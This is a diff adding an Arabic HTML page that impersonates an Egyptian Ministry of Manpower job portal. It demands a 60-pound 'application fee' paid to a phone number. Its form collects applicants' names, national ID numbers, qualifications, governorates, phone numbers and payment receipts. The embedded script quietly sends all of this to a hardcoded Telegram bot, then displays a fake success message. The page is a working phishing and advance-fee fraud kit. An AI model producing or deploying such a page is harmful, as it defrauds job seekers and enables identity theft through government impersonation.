@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>وزارة القوى العاملة - بوابة التوظيف المركزي</title>
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #002147; /* لون حكومي مناسب */
+      color: white;
+      padding: 20px;
+      text-align: center;
+      border-bottom: 5px solid #f4c542;
+    }
+    header img {
+      height: 80px;
+    }
+    header h1 {
+      color: #f4c542; /* اللون الذهبي المناسب للعنوان */
+      font-size: 36px;
+    }
+    header h2 {
+      color: #f4c542; /* اللون الذهبي المناسب للعنوان الفرعي */
+      font-size: 22px;
+    }
+    main {
+      max-width: 700px;
+      margin: 30px auto;
+      background: white;
+      padding: 30px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+    h1, h2 {
+      text-align: center;
+      color: #002147;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 20px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #aaa;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #002147;
+      color: white;
+      padding: 12px;
+      margin-top: 25px;
+      border: none;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .note {
+      background: #fff3cd;
+      color: #856404;
+      padding: 10px;
+      border: 1px solid #ffeeba;
+      margin-top: 20px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 12px;
+      color: gray;
+    }
+    .success {
+      color: green;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <!-- الشعار الجديد من Imgur -->
+  <img src="https://i.imgur.com/8m7Ht3B.png" alt="شعار الجمهورية">
+  <h1>وزارة القوى العاملة</h1>
+  <h2>البوابة الإلكترونية للتوظيف المركزي</h2>
+</header>
+
+<main>
+  <p><strong>بناءً على القرار الوزاري رقم 213 لسنة 2024</strong>، تعلن وزارة القوى العاملة عن فتح باب التقديم للوظائف التالية داخل جهات حكومية وغير حكومية وفقاً للضوابط المُعلنة.</p>
+
+  <div class="note">
+    يُرجى التأكد من صحة البيانات وعدم التقديم أكثر من مرة. رسوم التقديم: <strong>60 جنيهًا</strong> تُحوّل إلى الرقم <strong>01226530229</strong> ويُرفق إيصال الدفع بالصورة.
+  </div>
+
+  <form id="jobForm">
+    <label>الاسم الكامل:</label>
+    <input type="text" name="name" required>
+
+    <label>الرقم القومي:</label>
+    <input type="text" name="nid" maxlength="14" required>
+
+    <label>المؤهل الدراسي:</label>
+    <input type="text" name="degree" required>
+
+    <label>المحافظة:</label>
+    <input type="text" name="govern" required>
+
+    <label>رقم الهاتف:</label>
+    <input type="tel" name="phone" required>
+
+    <label>الوظيفة المطلوبة:</label>
+    <select name="job" required>
+      <option value="">-- اختر وظيفة --</option>
+      <option>موظف سجل مدني</option>
+      <option>أرشيف محكمة</option>
+      <option>أمن داخلي - وزارة الصحة</option>
+      <option>خدمة عملاء - شركة كهرباء</option>
+      <option>سكرتير إداري - مكتب تموين</option>
+      <option>عامل بصمة - المرور</option>
+    </select>
+
+    <label>إيصال التحويل (سكرين شوت):</label>
+    <input type="file" name="screenshot" accept="image/*" required>
+
+    <button type="submit">تأكيد الطلب</button>
+    <p id="statusMsg" class="success"></p>
+  </form>
+
+  <div style="text-align:center; margin-top:15px;">
+    <button onclick="window.print()">تحميل نموذج الطلب</button>
+  </div>
+
+</main>
+
+<div class="footer">
+  هذا الموقع نسخة تجريبية من النظام الموحد للتوظيف. جميع الحقوق محفوظة © وزارة القوى العاملة - 2024
+</div>
+
+<script>
+  const botToken = "7761346140:AAEjcM9JgLvliBk8KmahrvJWwa-H6IcKM0o";
+  const chatId = "5545530980"; // ID البوت
+
+  document.getElementById("jobForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const form = e.target;
+    const formData = new FormData(form);
+    const file = formData.get("screenshot");
+
+    const text = `
+طلب توظيف جديد:
+
+الاسم: ${formData.get("name")}
+الرقم القومي: ${formData.get("nid")}
+المؤهل: ${formData.get("degree")}
+المحافظة: ${formData.get("govern")}
+الهاتف: ${formData.get("phone")}
+الوظيفة المطلوبة: ${formData.get("job")}
+    `;
+
+    try {
+      // إرسال الرسالة النصية إلى البوت
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+
+      // إرسال الصورة (إيصال التحويل) إلى البوت
+      const photoData = new FormData();
+      photoData.append("chat_id", chatId);
+      photoData.append("photo", file);
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: photoData
+      });
+
+      document.getElementById("statusMsg").innerText = "تم تقديم الطلب بنجاح. سيتم التواصل معك خلال 72 ساعة.";
+      form.reset();
+    } catch (error) {
+      alert("حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.");
+    }
+  });
+</script>
+
+</body>
+</html>
